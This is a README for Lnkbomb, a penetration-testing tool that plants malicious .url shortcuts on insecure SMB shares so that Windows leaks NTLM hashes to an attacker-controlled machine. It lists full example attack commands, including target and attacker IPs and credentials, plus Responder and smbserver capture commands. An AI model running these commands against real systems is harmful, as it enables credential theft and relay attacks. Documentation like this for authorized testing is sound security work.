# Lnkbomb

[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/M4M03Q2JN)

<p align="center">
  <img src="https://github.com/dievus/lnkbomb/blob/dev/images/example.png" />
</p>

Lnkbomb is used for uploading malicious shortcut files to insecure file shares.  The vulnerability exists due to Windows looking for an icon file to associate with the shortcut file.  This icon file can be directed to a penetration tester's machine running Responder or smbserver to gather NTLMv1 or NTLMv2 hashes (depending on configuration of the victim host machine).  The tester can then attempt to crack those collected hashes offline with a tool like Hashcat, or relay them to a tool like ntlmrelayx for further exploitation.

The payload file is uploaded directly to the insecure file specified by the tester in the command line. The tester includes their IP address as well, which is written into the payload.

Version 2.0 is a total rebuild of the tool and uses the pysmb library, permitting unauthenticated and authenticated payload drops.

## Python Usage
Installing Lnkbomb

Note that the project works consistently in Windows. It may have issues in Linux.

```git clone https://github.com/dievus/lnkbomb.git```

Change directories to lnkbomb and run:

```python3 lnkbomb.py -h```

This will output the help menu, which contains the following flags:

```-h, --help - Lists the help options```

```-t, --target - Specifies the target IP address```

```-a, --attacker - Specifies the tester's attack machine IP address```

```-r, --recover - Used to remove the payload when testing is completed (ex. -r payloadname.url)```

```-w, --windows - New command - required for setting appropriate ports for Windows shares```

```-l, --linux - New command - required for setting appropriate ports for Linux shares```

```-n, --netbios - New command - netbios name for targeted Windows machines must be included```

Examples of full commands include:

```python3 .\lnkbomb.py -t 192.168.1.79 -a 192.168.1.21 -s Shared -u themayor -p Password123! -n dc01 --windows```

```python3 .\lnkbomb.py -t 192.168.1.79 -a 192.168.1.21 -s Shared -u themayor -p Password123! -n dc01 --windows -r dicnwdsebl.url```

You will need to utilize a tool like Responder or smbserver to capture the NTLM hash.  
```responder -I eth0 -dwFP -v```

or

```smbserver.py . . -smb2support```


<p align="center">
  <img src="https://github.com/dievus/lnkbomb/blob/dev/images/example2.png" />
</p>

### Notes
Please keep in mind that this tool is meant for ethical hacking and penetration testing purposes only. I do not condone any behavior that would include testing targets that you do not currently have permission to test against.  

I know it's .url shortcuts and not .lnk extensions. I do it to trigger you.
